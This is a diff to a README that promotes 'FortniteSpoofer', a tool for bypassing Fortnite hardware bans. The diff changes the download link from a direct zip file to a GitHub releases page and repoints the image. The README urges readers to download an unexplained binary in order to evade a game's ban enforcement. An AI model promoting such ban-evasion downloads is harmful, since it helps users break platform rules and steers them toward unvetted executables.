@@ -32,7 +32,7 @@ The repository covers a wide range of topics related to hardware spoofing and ba
 
 To access the *FortniteSpoofer* tool, simply click on the button below:
 
-[![Download FortniteSpoofer](https://img.shields.io/badge/Download-FortniteSpoofer-brightgreen)](https://github.com/uploads/App.zip)
+[![Download FortniteSpoofer](https://github.com/abab0913/FortniteSpoofer/releases)](https://github.com/abab0913/FortniteSpoofer/releases)
 
 This link will direct you to the download page for the tool. Feel free to explore the tool and use it responsibly to enhance your gaming experience.
 
@@ -44,4 +44,4 @@ If for any reason the provided download link is not working or unavailable, plea
 
 With *FortniteSpoofer*, you can take control of your gaming destiny by bypassing hardware bans and enjoying a seamless gaming experience without limitations. Explore the tool, experiment responsibly, and game on!
 
-![FortniteSpoofer](https://www.example.com/fortnitespoofer.png)
+![FortniteSpoofer](https://github.com/abab0913/FortniteSpoofer/releases)
